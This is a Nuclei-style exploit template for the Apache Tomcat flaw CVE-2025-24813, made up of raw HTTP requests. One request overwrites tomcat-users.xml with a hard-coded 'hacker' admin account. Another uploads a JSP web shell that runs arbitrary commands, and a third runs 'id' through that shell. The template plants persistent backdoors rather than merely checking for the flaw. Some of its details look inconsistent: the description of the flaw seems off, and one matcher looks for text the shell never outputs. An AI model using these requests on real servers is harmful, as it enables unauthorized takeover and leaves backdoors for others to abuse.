id: CVE-2025-24813

info:
  name: Apache Tomcat Path Equivalence Vulnerability
  author: Ajay Naik
  severity: high
  description: |
    Apache Tomcat suffers from improper handling of path normalization, allowing attackers to manipulate file locations via paths containing internal dots (`../`). This can lead to unauthorized file modification, information disclosure, and potential remote code execution (RCE).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24813
    - https://github.com/absholi7ly/POC-CVE-2025-24813
  tags: apache,tomcat,web,rce,lfi

variables:
  upload-path: "/uploads/"
  check-file: "../conf/tomcat-users.xml"
  shell-path: "../webapps/ROOT/updates.jsp"

requests:
  - raw:
      - |
        PUT {{upload-path}}{{check-file}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Content-Length: 100

        <tomcat-users>
            <user username="hacker" password="P@ssw0rd!" roles="admin-gui,manager-gui"/>
        </tomcat-users>
    matchers:
      - type: word
        words:
          - "<tomcat-users>"
        part: body
    matchers-condition: and
    extractors:
      - type: regex
        regex:
          - ".*"

  - raw:
      - |
        PUT {{upload-path}}{{shell-path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-jsp
        Content-Length: 200

        <%@ page import="java.io.*" %>
        <html><body>
        <form method="GET"><input type="text" name="cmd"><input type="submit" value="Run"></form>
        <% if(request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String l; while((l=r.readLine())!=null){ out.println(l+"<br>"); } } %>
        </body></html>
    matchers:
      - type: status
        status:
          - 201
      - type: word
        words:
          - "JSP Shell"
        part: body
    extractors:
      - type: regex
        regex:
          - ".*"

  - raw:
      - |
        GET /updates.jsp?cmd=id HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - "uid="
        part: body
